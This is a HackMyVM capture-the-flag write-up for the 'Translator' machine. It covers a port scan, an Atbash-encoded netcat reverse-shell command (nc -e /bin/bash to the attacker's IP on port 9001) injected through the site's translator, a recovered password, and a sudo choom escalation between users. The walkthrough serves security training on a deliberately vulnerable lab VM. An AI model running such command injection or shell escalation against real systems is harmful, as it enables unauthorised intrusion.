---
layout: post
title: "HackMyVM - Translator"
date: 2022-05-28 15:47:00 +0100
categories: hmv
tag: ["LFI"]
---

Creator: [sml](https://hackmyvm.eu/profile/?user=sml)
Level: Easy
Release Date: 2022-05-12

## Scan 

```bash
$ nmap -sC -sV -p- 192.168.1.83
Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-28 23:12 WEST
Nmap scan report for 192.168.1.83
Host is up (0.00025s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5 (protocol 2.0)
| ssh-hostkey: 
|   3072 08:cf:50:b2:4f:41:43:c4:66:56:ce:96:b9:04:8c:77 (RSA)
|   256 40:b7:11:24:76:59:cd:e0:79:db:71:d1:39:29:d5:45 (ECDSA)
|_  256 44:64:ba:b8:52:4f:ca:00:dd:3e:c3:28:71:6f:77:76 (ED25519)
80/tcp open  http    nginx 1.18.0
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: nginx/1.18.0
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.52 seconds
```

## Website 

<img src="https://drive.google.com/uc?id=14H9Li8D4Ie8s2Y-ZZl0RdBnObk_7maXh"/>

```
Translated to:  
mx -v /yrm/yzhs 192.168.1.6 9001 mx -v /yrm/yzts 192.168.1.6 9001
```

## Reverse Shell - [atbash](https://www.dcode.fr/atbash-cipher)

```bash
$ python3 -m pwncat -lp 9001
[23:29:45] Welcome to pwncat 🐈!                                                                                                                       __main__.py:164
[23:30:05] received connection from 192.168.1.83:34400                                                                                                      bind.py:84
[23:30:05] 192.168.1.83:34400: registered new host w/ db                                                                                                manager.py:957
(local) pwncat$                                                                                                                                                       
(remote) www-data@translator:/var/www/html$ 
(remote) www-data@translator:/var/www/html$ ls -la
total 20
drwxr-xr-x 2 www-data www-data 4096 May 11 10:29 .
drwxr-xr-x 3 root     root     4096 May 11 10:25 ..
-rw-r--r-- 1 www-data www-data   24 May 11 10:29 hvxivg
-rw-r--r-- 1 www-data www-data  290 May 11 10:29 index.html
-rw-r--r-- 1 www-data www-data  258 May 11 10:29 translate.php
(remote) www-data@translator:/var/www/html$ cat hvxivg 
Mb kzhhdliw rh zbfie3w4
```

```
Translated to:  
My password is ayurv3d4
```

```bash
(remote) www-data@translator:/var/www/html$ su -l india
Password: 
su: Authentication failure
(remote) www-data@translator:/var/www/html$ su -l ocean
Password: 
ocean@translator:~$ 
```

## Lateral movement (ocean > india) - [choom](https://gtfobins.github.io/gtfobins/choom/)

```bash
ocean@translator:~$ sudo -l
Matching Defaults entries for ocean on translator:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User ocean may run the following commands on translator:
    (india) NOPASSWD: /usr/bin/choom
```

<img src="https://drive.google.com/uc?id=192ybPqkkx4eqM_7NehMJB6Ma3PSP0mpU"/>

```bash
ocean@translator:~$ sudo -u india /usr/bin/choom -n 1 /bin/bash
india@translator:/home/ocean$

india@translator:~$ sudo -l
Matching Defaults entries for india on translator:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User india may run the following commands on translator:
    (root) NOPASSWD: /usr/local/bin/trans
india@translator:~$ 

```

## ROOT

```url
translate.googleapis.com/translate_a/single?client=gtx&ie=UTF-8&oe=UTF-8&dt=bd&dt=ex&dt=ld&dt=md&dt=rw&dt=rm&dt=ss&dt=t&dt=at&dt=gt&dt=qc&sl=auto&tl=es&hl=es&q=h87M5364V2343ubvgfy
```

```
[[["h87M5364V2343ubvgfy","h87M5364V2343ubvgfy",null,null,3,null,null,[[],[]],[[["43737a5d5c1006e000d83270e053c806","ar_en_2021q1.md"]],[["03214100749bedbdf1de4331ab408186","en_es_2021q4.md"]]]],[null,null,null,"h87M5364V2343ubvgfy"]],null,"ar",null,null,[["h87M5364V2343ubvgfy",null,[["h87M5364V2343ubvgfy",0,true,false,[3]]],[[0,19]],"h87M5364V2343ubvgfy",0,0]],0.9053506,[],[["ar"],null,[0.9053506],["ar-Latn"]],null,null,null,null,null,null,null,null,null,[null,2]]
```